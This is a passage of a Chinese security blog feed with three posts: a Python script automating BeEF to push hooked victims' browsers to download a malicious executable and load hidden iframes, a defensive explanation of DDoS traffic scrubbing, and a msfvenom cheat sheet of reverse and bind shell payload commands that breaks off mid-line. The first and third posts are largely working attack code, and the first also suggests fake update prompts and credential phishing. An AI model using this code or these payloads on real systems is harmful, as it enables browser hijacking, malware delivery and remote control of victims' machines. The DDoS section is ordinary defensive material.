class="token punctuation">(</span><span class="token punctuation">)</span>                 <span class="token comment" spellcheck="true"># 获取服务器返回的页面信息，数据类型为str</span>    jsondata <span class="token operator">=</span>  json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>resdata<span class="token punctuation">)</span>           <span class="token comment" spellcheck="true"># 把数据解析成python对象，此时返回dict数据</span>    <span class="token keyword">return</span> jsondata<span class="token punctuation">[</span><span class="token string">'token'</span><span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">getHookedBrowsersSession</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span>authkey<span class="token punctuation">)</span><span class="token punctuation">:</span>    f <span class="token operator">=</span> urllib2<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span>host <span class="token operator">+</span> <span class="token string">"/api/hooks?token="</span> <span class="token operator">+</span> authkey<span class="token punctuation">)</span>    data <span class="token operator">=</span> json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    hookonline <span class="token operator">=</span> data<span class="token punctuation">[</span><span class="token string">'hooked-browsers'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'online'</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> x <span class="token keyword">in</span> hookonline<span class="token punctuation">:</span>        hookid <span class="token operator">=</span> hookonline<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span>        hookip <span class="token operator">=</span> hookonline<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'ip'</span><span class="token punctuation">]</span>        hooksession <span class="token operator">=</span> hookonline<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'session'</span><span class="token punctuation">]</span>        <span class="token keyword">if</span> hookid <span class="token operator">not</span> <span class="token keyword">in</span> hostdict<span class="token punctuation">:</span>            hostdict<span class="token punctuation">[</span>hookid<span class="token punctuation">]</span> <span class="token operator">=</span> hooksession            <span class="token keyword">print</span> <span class="token string">"\n[+] Hooked host id:  "</span> <span class="token operator">+</span> bytes<span class="token punctuation">(</span>hookid<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"\n   >>> IP: "</span> <span class="token operator">+</span> bytes<span class="token punctuation">(</span>hookip<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"\n   >>> Session: "</span> <span class="token operator">+</span> hooksession<span class="token keyword">def</span> <span class="token function">sendConfirm</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span> session<span class="token punctuation">,</span> authkey<span class="token punctuation">)</span><span class="token punctuation">:</span>    postdata <span class="token operator">=</span> <span class="token string">'{}'</span>    url <span class="token operator">=</span> host <span class="token operator">+</span> <span class="token string">"api/modules/"</span> <span class="token operator">+</span> session <span class="token operator">+</span> <span class="token string">"/177?token="</span> <span class="token operator">+</span> authkey    <span class="token comment" spellcheck="true">#print url</span>    req <span class="token operator">=</span> urllib2<span class="token punctuation">.</span>Request<span class="token punctuation">(</span>url<span class="token punctuation">,</span> postdata<span class="token punctuation">)</span>    req<span class="token punctuation">.</span>add_header<span class="token punctuation">(</span><span class="token string">"Content-Type"</span><span class="token punctuation">,</span> <span class="token string">"application/json; charset=UTF-8"</span><span class="token punctuation">)</span>    f <span class="token operator">=</span> urllib2<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span>req<span class="token punctuation">)</span>    <span class="token keyword">print</span> <span class="token string">"   >>> [+] Module Confirm Close Tab has been Executed ! "</span>    <span class="token keyword">return</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">execJavascript</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span> session<span class="token punctuation">,</span> authkey<span class="token punctuation">)</span><span class="token punctuation">:</span>    payload<span class="token operator">=</span><span class="token punctuation">{</span>        <span class="token string">"cmd"</span><span class="token punctuation">:</span><span class="token string">"alert('Hello by ssooking!');"</span>    <span class="token punctuation">}</span>    apiurl <span class="token operator">=</span> host <span class="token operator">+</span> <span class="token string">"api/modules/"</span> <span class="token operator">+</span> session <span class="token operator">+</span> <span class="token string">"/169?token="</span> <span class="token operator">+</span> authkey    jdata <span class="token operator">=</span> json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    req <span class="token operator">=</span> urllib2<span class="token punctuation">.</span>Request<span class="token punctuation">(</span>apiurl<span class="token punctuation">,</span> jdata<span class="token punctuation">)</span>    req<span class="token punctuation">.</span>add_header<span class="token punctuation">(</span><span class="token string">"Content-Type"</span><span class="token punctuation">,</span> <span class="token string">"application/json; charset=UTF-8"</span><span class="token punctuation">)</span>    response <span class="token operator">=</span> urllib2<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span>req<span class="token punctuation">)</span>    resdata <span class="token operator">=</span> response<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">print</span> <span class="token string">"   >>> [+] Module Raw JavaScript has been Executed ! "</span>    <span class="token keyword">return</span> resdata<span class="token keyword">def</span> <span class="token function">redirectBrowser</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span> session<span class="token punctuation">,</span> authkey<span class="token punctuation">)</span><span class="token punctuation">:</span>    payload <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"redirect_url"</span><span class="token punctuation">:</span><span class="token string">"http://192.168.1.133:8000/plugins.exe"</span><span class="token punctuation">}</span>    apiurl <span class="token operator">=</span> host <span class="token operator">+</span> <span class="token string">"api/modules/"</span> <span class="token operator">+</span> session <span class="token operator">+</span> <span class="token string">"/42?token="</span> <span class="token operator">+</span> authkey    jdata <span class="token operator">=</span> json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    req <span class="token operator">=</span> urllib2<span class="token punctuation">.</span>Request<span class="token punctuation">(</span>apiurl<span class="token punctuation">,</span> jdata<span class="token punctuation">)</span>    req<span class="token punctuation">.</span>add_header<span class="token punctuation">(</span><span class="token string">"Content-Type"</span><span class="token punctuation">,</span> <span class="token string">"application/json; charset=UTF-8"</span><span class="token punctuation">)</span>    response <span class="token operator">=</span> urllib2<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span>req<span class="token punctuation">)</span>    resdata <span class="token operator">=</span> response<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>    jsondata <span class="token operator">=</span>  json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>resdata<span class="token punctuation">)</span>    <span class="token keyword">print</span> <span class="token string">"   >>> [+] Module Redirect Browser has been Executed ! "</span>    <span class="token keyword">return</span> jsondata<span class="token keyword">def</span> <span class="token function">createIFrame</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span> sessionId<span class="token punctuation">,</span> authkey<span class="token punctuation">)</span><span class="token punctuation">:</span>    postdata <span class="token operator">=</span> <span class="token string">'{"target":"http://192.168.1.133:8000/"}'</span>    url <span class="token operator">=</span> host <span class="token operator">+</span> <span class="token string">"api/modules/"</span> <span class="token operator">+</span> sessionId <span class="token operator">+</span> <span class="token string">"/174?token="</span> <span class="token operator">+</span> authkey    req <span class="token operator">=</span> urllib2<span class="token punctuation">.</span>Request<span class="token punctuation">(</span>url<span class="token punctuation">,</span> postdata<span class="token punctuation">)</span>    req<span class="token punctuation">.</span>add_header<span class="token punctuation">(</span><span class="token string">"Content-Type"</span><span class="token punctuation">,</span> <span class="token string">"application/json; charset=UTF-8"</span><span class="token punctuation">)</span>    f <span class="token operator">=</span> urllib2<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span>req<span class="token punctuation">)</span>    <span class="token keyword">print</span> <span class="token string">"   >>> [+] Module Create Invisible Iframe has been Executed ! "</span>    <span class="token keyword">return</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">autoRunModules</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span>session<span class="token punctuation">,</span>authkey<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">#sendConfirm(host, session, authkey)</span>    <span class="token comment" spellcheck="true">#execJavascript(host, session, authkey)</span>    redirectBrowser<span class="token punctuation">(</span>host<span class="token punctuation">,</span> session<span class="token punctuation">,</span> authkey<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">timeRun</span><span class="token punctuation">(</span>interval<span class="token punctuation">,</span>host<span class="token punctuation">)</span><span class="token punctuation">:</span>    authkey <span class="token operator">=</span> getauthkey<span class="token punctuation">(</span>host<span class="token punctuation">)</span>    <span class="token keyword">print</span> <span class="token string">"[+] AutoBeef is running...."</span>    <span class="token keyword">print</span> <span class="token string">"[+] BeEF KEY is : "</span><span class="token operator">+</span> authkey    <span class="token keyword">print</span> <span class="token string">"[+] Base BeEF API URL: "</span><span class="token operator">+</span> host <span class="token operator">+</span> <span class="token string">"api/"</span>    <span class="token keyword">print</span> <span class="token string">"[+] Hook URL   : "</span> <span class="token operator">+</span> host <span class="token operator">+</span> <span class="token string">"hook.js"</span>    <span class="token keyword">print</span> <span class="token string">"[+] Hook Demo  : "</span> <span class="token operator">+</span> host <span class="token operator">+</span> <span class="token string">"demos/basic.html"</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            getHookedBrowsersSession<span class="token punctuation">(</span>host<span class="token punctuation">,</span> authkey<span class="token punctuation">)</span>            <span class="token keyword">for</span> x <span class="token keyword">in</span> hostdict<span class="token punctuation">:</span>                <span class="token keyword">if</span> hostdict<span class="token punctuation">[</span>x<span class="token punctuation">]</span> <span class="token operator">not</span> <span class="token keyword">in</span> hostlist<span class="token punctuation">:</span>                    hostlist<span class="token punctuation">.</span>append<span class="token punctuation">(</span>hostdict<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">)</span>                    autoRunModules<span class="token punctuation">(</span>host<span class="token punctuation">,</span>hostdict<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">,</span>authkey<span class="token punctuation">)</span>            time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span>interval<span class="token punctuation">)</span>        <span class="token keyword">except</span> Exception<span class="token punctuation">,</span> e<span class="token punctuation">:</span>            <span class="token keyword">print</span> e<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    beefhost <span class="token operator">=</span> <span class="token string">"http://192.168.1.133:3000/"</span>    timeRun<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span>beefhost<span class="token punctuation">)</span></code></pre><p>代码比较挫，没有什么要说的，容易遇到问题的地方是处理返回的数据类型，需要注意str，dict，list等数据类型的处理与转换。我先只执行一个<code>Redirect Browser</code>模块  <img src="https://images2015.cnblogs.com/blog/1012328/201706/1012328-20170617003311540-78403110.png" alt="img"></p><p>程序检测到有新的上线控制僵尸，会控制浏览器自动下载我们的恶意程序</p><p><img src="https://images2015.cnblogs.com/blog/1012328/201706/1012328-20170617003541103-212055404.png" alt="img"></p><p><img src="https://images2015.cnblogs.com/blog/1012328/201706/1012328-20170615152255946-2107420660.png" alt="img"></p><p>一旦受害者点击这个程序</p><p><img src="https://images2015.cnblogs.com/blog/1012328/201706/1012328-20170615152403571-828718163.png" alt="img"></p><p><img src="https://images2015.cnblogs.com/blog/1012328/201706/1012328-20170617001607243-12774633.png" alt="img"></p><p>当受害者运行恶意软件时，我们可以获得控制权</p><p><img src="https://images2015.cnblogs.com/blog/1012328/201706/1012328-20170617002351884-563419008.png" alt="img"></p><p> 当然我们也可以执行多个模块，你只需要在<code>autoRunModules</code>函数中添加你想执行的模块即可，比如我再测试执行<code>Confirm Close Tab</code>，<code>Raw Javascript</code>两个模块</p><p><img src="https://images2015.cnblogs.com/blog/1012328/201706/1012328-20170617005001353-1901279339.png" alt="img"></p><p> 但是需要注意的是，有些模块功能上是冲突的，不能一起执行，比如刚才的例子<code>Confirm Close Tab</code>和<code>Redirect Browser</code>。</p><p><img src="https://images2015.cnblogs.com/blog/1012328/201706/1012328-20170617004455790-594573000.png" alt="img"></p><p><img src="https://images2015.cnblogs.com/blog/1012328/201706/1012328-20170617004850509-742204547.png" alt="img"></p><p><img src="https://images2015.cnblogs.com/blog/1012328/201706/1012328-20170617004904337-1959497895.png" alt="img"></p><p> 我们可以执行多个模块，运行截图</p><p> <img src="https://images2015.cnblogs.com/blog/1012328/201706/1012328-20170617004610321-454563044.png" alt="img"></p><p>到这里也就基本差不多了，只要思路够开阔，就有很多好玩的姿势，下面一些好玩的模块：</p><blockquote><p>Create Invisible Frame    + Browser Autopwn ：我们可以用metasploit的 Browser Autopwn模块生成一个攻击浏览器的url，然后创建一个隐藏的iframe指向这个url</p><p>Raw Javascript ： 光是这个就能干很多事，不只是弹框哦～～</p><p>Fake Notification Bar ，Fake Flash Update： 伪装浏览器插件，flash升级等，配合执行恶意软件</p><p>Pretty Theft： 欺骗认证凭据的，可以试着自己做个模板，哪里能用到？。。报名统计啦，手机投票啦～～</p></blockquote><p>配合一些漏洞</p><blockquote><p>ms10-046　Microsoft Windows Shell LNK Code Execution</p><p>CVE-2015-0096 Microsoft Windows Shell SMB LNK Code Execution Exploit</p></blockquote><p>不知道能不能配合永恒之蓝的msf模块～～～～</p><p>对于手机，也有很多模块可以使用</p><p><img src="https://images2015.cnblogs.com/blog/1012328/201706/1012328-20170617121511915-926020588.png" alt="img"></p><p><strong>关于代码</strong> </p><p>如果你要使用AutoBeef，你需要对代码进行一些修改使其适应你的beef平台，比如beef主机地址，某个模块的id等等。你可以根据自己的需要添加相关模块，你也可以对其进行优化，使其更加健壮。其实官方也提供了beefapi的库，你可以在这里找到<a href="https://github.com/byt3bl33d3r/BeEF-API/blob/master/beefapi.py" target="_blank" rel="noopener">https://github.com/byt3bl33d3r/BeEF-API/blob/master/beefapi.py</a>。通过调用里面的函数，我们也可以很方面地对beef进行控制，但是涉及到执行某个模块时，我们还是需要查看模块详细信息，提供其必要的参数。所以，我建议自己可以动手实现一下，只有这样我们才能进步提高，而且自己写的代码，可以根据自己的需要随时进行拓展修改，遇到问题也能很快解决。</p><p>如果你要使用官方提供的beefAPI，你需要把它移植到你的python库中,kali里默认路径是这样：</p><pre class=" language-bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">cp</span> beefapi.py /usr/lib/python2.7/dist-packages/</code></pre><p> 使用的时候从beefapi中导入即可，你可以查看帮助或者阅读其源代码</p><p><img src="https://images2015.cnblogs.com/blog/1012328/201706/1012328-20170617123124759-1335061642.png" alt="img"></p><p><img src="https://images2015.cnblogs.com/blog/1012328/201706/1012328-20170617123219259-2082291478.png" alt="img"></p><p><strong>遇到的问题</strong></p><p>　　测试过程中我使用的是chrome和firefox，并且发现IE,360等浏览器无法正常hook。</p><h1 id="四-最后的话"><a href="#四-最后的话" class="headerlink" title="四. 最后的话"></a>四. 最后的话</h1><p>　　只是一句话，不要随便点开一个链接。</p><p>参考文章</p><p><a href="https://github.com/beefproject/beef/wiki/BeEF-RESTful-API" target="_blank" rel="noopener">https://github.com/beefproject/beef/wiki/BeEF-RESTful-API</a></p><p><a href="https://github.com/byt3bl33d3r/BeEF-API/blob/master/beefapi.py" target="_blank" rel="noopener">https://github.com/byt3bl33d3r/BeEF-API/blob/master/beefapi.py</a></p>]]></content>
      
      
      <categories>
          
          <category> 神兵利器 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> BeEF </tag>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>攻击流量的清洗</title>
      <link href="/2017/06/16/gong-ji-liu-liang-de-qing-xi/"/>
      <url>/2017/06/16/gong-ji-liu-liang-de-qing-xi/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>　　流量清洗是指在全部的网络流量中区分出正常流量和恶意流量，将恶意流量阻断和丢弃，而只将正常的流量交付给服务器。与其他的网络安全检测和防护手段类似，流量清洗也需要考虑漏报率和误报率的问题。通常，漏报率和误报率是一对矛盾，需要通过对检测和防护规则的调整来进行平衡。</p><p>​    如果流量清洗的漏报率太高，就会有大量的攻击请求穿透流量清洗设备，如果无法有效地减少攻击流量，也就达不到减轻服务器压力的效果；相反，如果误报率太高，就会出现大量的正常请求在清洗过程中被中断，严重影响正常的服务和业务运行。</p><p>​    优秀的流量清洗设备，应该能够同时将误报率和漏报率降低到可以接受的程度，这样就能够在不影响网络或业务系统正常运行的情况下，最大限度地将恶意攻击流量从全部网络流量中去除。要达到这个目的，需要同时使用多种准确而高效的清洗技术，这些技术包括：</p><ul><li>IP信誉检查</li><li>攻击特征匹配</li><li>速度检查与限制</li><li>TCP代理和验证</li><li>协议完整性验证</li><li>客户端真实性验证</li></ul><h2 id="IP信誉检查"><a href="#IP信誉检查" class="headerlink" title="IP信誉检查"></a>IP信誉检查</h2><p>　　IP信誉机制是指为互联网上的IP地址赋予一定的信誉值，那些过去或现在经常被作为僵尸主机发送垃圾邮件或发动拒绝服务攻击的IP地址会被赋予较低的信誉值，说明这些IP地址更有可能成为网络攻击的来源。</p><p>　　IP信誉检查的极端情况就是IP黑名单机制，即如果数据包的来源存在于黑名单当发生分布式拒绝服务攻击时，流量清洗设备会对通过的网络流量进行IP信誉检查，在其内部的IP地址信誉库中查找每一个数据包来源的信誉值，并会优先丢弃信誉值低的IP地址所发来的数据包或建立的会话连接，以此保证信誉高的IP地址与服务器的正常通信。</p><h2 id="攻击特征匹配"><a href="#攻击特征匹配" class="headerlink" title="攻击特征匹配"></a>攻击特征匹配</h2><p>　　在大多数情况下，发动分布式拒绝服务攻击需要借助攻击工具。为了提高发送请求的效率，<strong>攻击工具发出的数据包通常是由编写者伪造并固化到工具当中的</strong>，而不是在交互过程中产生的，因此一种攻击工具所发出的数据包载荷会具有一些特征。流量清洗设备可以<strong>将这些数据包载荷中的特征作为指纹</strong>，来识别工具发出的攻击流量。指纹识别可以分为静态指纹识别和动态指纹识别两种。</p><p>​    静态指纹识别是指预先将多种攻击工具的指纹特征保存在流量清洗设备内部，设备将经过的网络数据包与内部的特征库进行比对，直接丢弃符合特征的数据包。</p><p>​    动态指纹识别则需要清洗设备对流过的网络数据包进行学习，在学习到若干个数据包的载荷部分之后，将其指纹特征记录下来，后续命中这些指纹特征的数据包会被丢弃，而长期不被命中的指纹特征会逐渐老化直至消失。</p><h2 id="速度检查与限制"><a href="#速度检查与限制" class="headerlink" title="速度检查与限制"></a>速度检查与限制</h2><p>　　一些攻击方法在数据包载荷上可能并不存在明显的特征，没有办法进行攻击特征匹配，但却在请求数据包发送的频率和速度上有着明显的异常。这些攻击方法可以通过速度检查与限制来进行清洗。</p><p>​    例如，在受到<code>THC SSL DoS</code>攻击时，会在同一个SSL会话中多次进行加密密钥的重协商，而正常情况下是不会反复重协商加密密钥的。因此，当流量清洗设备进行统计时，如果发现SSL会话中密钥重协商的次数超过了特定的阈值，就可以直接中断这个会话并把来源加入黑名单中。</p><p>​    再如，在受到Slowloris和慢速POST请求攻击时，客户端和服务器之间会以非常低的速率进行交互和数据传输。流量清洗设备在发现HTTP的请求长时间没有完成传输时，就可以将会话中断。此外，对于UDP洪水攻击等一些没有明显特征、仅通过大流量进行攻击的方法，可以通过限制流速的方式对其进行缓解。</p><h2 id="TCP代理和验证"><a href="#TCP代理和验证" class="headerlink" title="TCP代理和验证"></a>TCP代理和验证</h2><p>　　SYN洪水攻击等攻击方式都是利用TCP协议的弱点，将被攻击目标的连接表占满，使其无法创建新的连接而达到拒绝服务攻击的目的。流量清洗设备可以通过TCP代理和验证的方法来缓解这种攻击造成的危害。</p><p>​    在一个TCP SYN请求到达流量清洗设备后，设备并不将它交给后面的服务器，而是直接回复一个<code>SYN+ACK响应</code>，并等待客户端回复。如果SYN请求来自合法的用户，那么他会对SYN+ACK进行响应，这时流量清洗设备会代替用户与其保护之后，合法的用户和服务器之间就可以透过流量清洗设备，进行正常数据通信。对于用户来说整个过程是完全透明的，正常的交互没有受到任何影响。然后服务器建立起TCP连接，并将这个连接加入信任列表当中。而如果这个SYN请求来自攻击者，那么它通常不会对SYN+ACK进行应答，从而形成半开连接。这样流量清洗设备会暂时保留这个半开连接，并在经过短暂的超时时间之后丢弃这个连接</p><p>　　相比于所保护的服务器，流量清洗设备对连接表操作进行了专门优化，能够处理极其庞大的连接请求数量，因此即使有非常多的SYN请求同时涌向清洗设备，清洗设备也能够处理。在这个过程中，由于清洗设备拦截在被保护的服务器之前，服务器并没有消耗任何的连接资源，因此保证了服务器的性能不受影响。</p><p>​    流量清洗设备在作为TCP代理进行防护时，除了拦截半开连接外，还可以进行TCP协议的一些交互式验证。例如，在收到第一个SYN请求时，通过直接丢弃、发送RST包或发送错误序列号的ACK包的方式来中断连接过程，并检查客户端是否重新发起连接请求。通过这种验证，也可以识别并丢弃许多不合法的连接。</p><h2 id="协议完整性验证"><a href="#协议完整性验证" class="headerlink" title="协议完整性验证"></a>协议完整性验证</h2><p>　　为了提高发送攻击请求的效率，大多数的攻击方法都会只发送攻击请求，而不接收服务器响应的数据，或者无法完全理解和处理响应数据。因此，如果能够对请求来源进行交互式验证，就可以检查请求来源协议实现的完整性。</p><p>​        对于协议实现不完整的请求来源，通常可以将其作为攻击主机丢弃其发送的数据。在DNS解析的过程中，如果域名解析请求获得的响应数据中Flags字段的Truncated位被置位，通常客户端就会使用TCP 53端口重新发送域名解析请求。而攻击者使用的攻击工具由于不接收或不处理解析请求的响应数据，也就不会使用TCP 53端口进行重新连接。流量清洗设备可以利用这个区别来有效地区分合法用户与攻击者，拦截恶意的DNS攻击请求</p><p>　　对于提供HTTP服务的Web服务器，也可以使用类似的方式进行协议完整性验证。例如，可以使用HTTP协议中的302重定向来验证请求的来源是否接收了响应数据并完整实现了HTTP协议的功能。HTTP的302状态码表示被请求的资源被临时转移，并会给出一个转移后的地址。正常的合法用户在接收到302重定向后会顺着跳转地址寻找对应的资源，而攻击者的攻击工具由于不接收或不处理响应数据，则不会进行跳转，因此攻击请求会被清洗设备拦截，Web服务器不会受到任何影响。</p><h2 id="客户端真实性验证"><a href="#客户端真实性验证" class="headerlink" title="客户端真实性验证"></a>客户端真实性验证</h2><p>　　进行协议完整性验证能够清洗掉一部分简单的攻击工具所发送的攻击流量，但是，一些攻击工具在开发过程中使用了现成的协议库，这样就能够完整实现协议交互，通过协议完整性检验。对于这些攻击工具，需要使用客户端真实性验证技术进行攻击流量清洗。</p><p>​    客户端真实性验证是指对客户端程序进行挑战–应答式的交互验证，检查客户端能否完成特定的功能，以此来确定请求数据是否来自真实的客户端。对基于页面的Web服务，可以通过检查客户端是否支持JavaScript来验证请求是否来自真实的浏览器客户端。<strong>当收到HTTP请求时，流量清洗设备会使用JavaScript等脚本语言发送一条简单的运算操作。</strong>如果请求是由真实的浏览器发出的，那么浏览器会进行正确运算并返回结果，流量清洗设备进行结果验证后就会让浏览器进行正确运算并返回结果，流量清洗设备进行结果验证后就会让浏览器跳转到Web服务器上真正的资源位置，不会影响正常用户的访问；而如果请求是由攻击者通过攻击工具发送的，由于大部分工具没有实现JavaScript的解析和执行功能，因而不能返回正确的运算结果，流量清洗设备会直接丢弃这些请求，而不会给出跳转到Web服务器的连接，因此Web服务器不会受到影响</p><p>　　当然，攻击者也可以牺牲工具的一部分攻击效率，并在工具中加入JavaScript的解析和执行功能，以便通过JavaScript验证。这时，则需要使用验证码进行人机识别。验证码的全称是“全自动区分计算机和人类的图灵测试”<code>（Completely Automated Public Turing test to tell Computers and Humans Apart，CAPTCHA）</code>，这是一种用于分辨人与计算机的反向图灵测试。</p><h2 id="图灵测试和反向图灵测试"><a href="#图灵测试和反向图灵测试" class="headerlink" title="图灵测试和反向图灵测试"></a>图灵测试和反向图灵测试</h2><p>　　图灵测试（又称<code>图灵判断</code>）是图灵提出的一个关于机器人的著名判断原则。图灵测试是一种测试机器是不是具备人类智能的方法：被测试的包括一个人和一台声称自己有人类智力的机器。测试人在与被测试者（一个人和一台机器）隔开的情况下，通过一些装置（如键盘）向被测试者随意提问。问过一些问题后，如果测试人不能确认被测试者的答复中哪个是人、哪个是机器的回答，那么这台机器就通过了测试，并被认为具有人类智能。目前，还没有一台机器能够通过图灵测试。可以看出，图灵测试是由人来出题考验机器，其目的是让出题人无法分辨给出答案的是人还是机器；而验证码与这个过程相反，是由机器来自动生成题目，其目的是让出题人能够有效地分辨给出答案的是不是真实的人。因此，验证码通常被认为是一种反向图灵测试。常见的验证码是让用户输入一个扭曲变形的图片上所显示的文字。对于真实的人类用户来说，通常能够比较容易地识别出这些文字，给出正确的识别结果，从而通过测试并继续进行访问</p><p>　　而对于计算机来说，想要识别验证码中的文字则相当困难。对于无法给出验证码正确识别结果的请求，流量清洗设备会直接丢弃，从而保护Web服务器不受影响误区：DDoS的云端清洗服务和本地缓解设备可以相互替代。DDoS其实是多种攻击的统称，不同的攻击也许要不同的缓解方法。通常，云端清洗服务主要采用稀释和分流的方法，擅长应对流量型DDoS攻击；而本地缓解设备能够处理的流量较小，更容易组合使用多种清洗技术，适合对抗系统资源消耗型和应用资源消耗型DDoS攻击。用户应该根据自己的业务特点和主要威胁，选择适合自身的解决方案。</p>]]></content>
      
      
      <categories>
          
          <category> 安全建设 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DDOS </tag>
            
            <tag> IDS </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>msfvenom生成payload</title>
      <link href="/2016/11/15/msfvenom-sheng-cheng-payload/"/>
      <url>/2016/11/15/msfvenom-sheng-cheng-payload/</url>
      
        <content type="html"><![CDATA[<h1 id="msfvenom重要参数"><a href="#msfvenom重要参数" class="headerlink" title="msfvenom重要参数"></a>msfvenom重要参数</h1><p>查看payloads: <code>msfvenom --list payloads</code><br>查看支持的文件格式：<code>msfvenom --help-formats</code><br>查看<code>payload</code>所需参数：<code>msfvenom -p xxx --payload-options</code></p><p>编码参数</p><pre class=" language-bash"><code class="language-bash">-e x86/shikata_ga_nai -i 5 -b <span class="token string">"\x00"</span> //使用shikata_ga_nai编码器编码5次并去除空字符</code></pre><h1 id="常用payload"><a href="#常用payload" class="headerlink" title="常用payload"></a>常用payload</h1><pre class=" language-bash"><code class="language-bash">windows/shell_bind_tcpwindows/meterpreter/bind_tcpwindows/meterpreter/reverse_tcpwindows/x64/meterpreter/reverse_tcplinux/x86/shell_bind_tcplinux/x86/meterpreter_reverse_tcp</code></pre><h2 id="System-Payloads"><a href="#System-Payloads" class="headerlink" title="System Payloads"></a>System Payloads</h2><h3 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h3><pre class=" language-bash"><code class="language-bash">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST<span class="token operator">=</span>xxx LPORT<span class="token operator">=</span>xxx -f elf <span class="token operator">></span> shell.elf</code></pre><h3 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h3><p>messagebox Test</p><pre class=" language-bash"><code class="language-bash">msfvenom -a x86 -p windows/messagebox TEXT<span class="token operator">=</span><span class="token string">"hello, it is a test"</span></code></pre><p>windows下生成32位/64位payload时需要注意。</p><pre class=" language-bash"><code class="language-bash">msfvenom -a x86 --platform windows -p windows/shell_bind_tcp LHOST<span class="token operator">=</span>xxx LPORT<span class="token operator">=</span>xxx -f exe <span class="token operator">></span> shell.exemsfvenom -p windows/meterpreter/reverse_tcp LHOST<span class="token operator">=</span>xxx LPORT<span class="token operator">=</span>xxx -f exe <span class="token operator">></span> shell.exemsfvenom -p windows/x64/meterpreter/reverse_tcp LHOST<span class="token operator">=</span>xxx LPORT<span class="token operator">=</span>xxx -f exe <span class="token operator">></span> shell.exe</code></pre><p>以<code>windows/meterpreter/reverse_tcp</code>为例，该payload默认为32位，也可使用<code>-a x86</code>选项指定。</p><p>如果要生成64位，则payload为<code>windows/x64/meterpreter/reverse_tcp</code>。</p><h3 id="Netcat"><a href="#Netcat" class="headerlink" title="Netcat"></a>Netcat</h3><p>nc正向连接</p><pre class=" language-bash"><code class="language-bash">msfvenom -p windows/shell_hidden_bind_tcp rhost<span class="token operator">=</span>192.168.0.107 lport<span class="token operator">=</span>8956 -f exe<span class="token operator">></span> 1.exe      </code></pre><p> nc反向连接，监听</p><pre class=" language-bash"><code class="language-bash">msfvenom -p windows/shell_reverse_tcp lhost<span class="token operator">=</span>192.168.0.107 lport<span class="token operator">=</span>888 -f exe<span class="token operator">></span> 1.exe</code></pre><h3 id="Mac"><a href="#Mac" class="headerlink" title="Mac"></a>Mac</h3><pre class=" language-bash"><code class="language-bash">msfvenom -p osx/x86/shell_reverse_tcp LHOST<span class="token operator">=</span>xxx LPORT<span class="token operator">=</span>xxx -f macho <span class="token operator">></span> shell.macho</code></pre><h3 id="Android"><a href="#Android" class="headerlink" title="Android"></a>Android</h3><pre class=" language-bash"><code class="language-bash">msfvenom -a dalvik -p android/meterpreter/reverse_tcp LHOST<span class="token operator">=</span>xxx LPORT<span class="token operator">=</span>xxx -f raw <span class="token operator">></span> shell.apk</code></pre><h2 id="Web-Payloads"><a href="#Web-Payloads" class="headerlink" title="Web Payloads"></a>Web Payloads</h2><h3 id="php"><a href="#php" class="headerlink" title="php"></a>php</h3><pre class=" language-bash"><code class="language-bash">msfvenom -p php/meterpreter_reverse_tcp LHOST<span class="token operator">=</span>xxx LPORT<span class="token operator">=</span>xxx -f raw <span class="token operator">></span> shell.php<span class="token function">cat</span> shell.php <span class="token operator">|</span> pbcopy <span class="token operator">&amp;&amp;</span> <span class="token keyword">echo</span> <span class="token 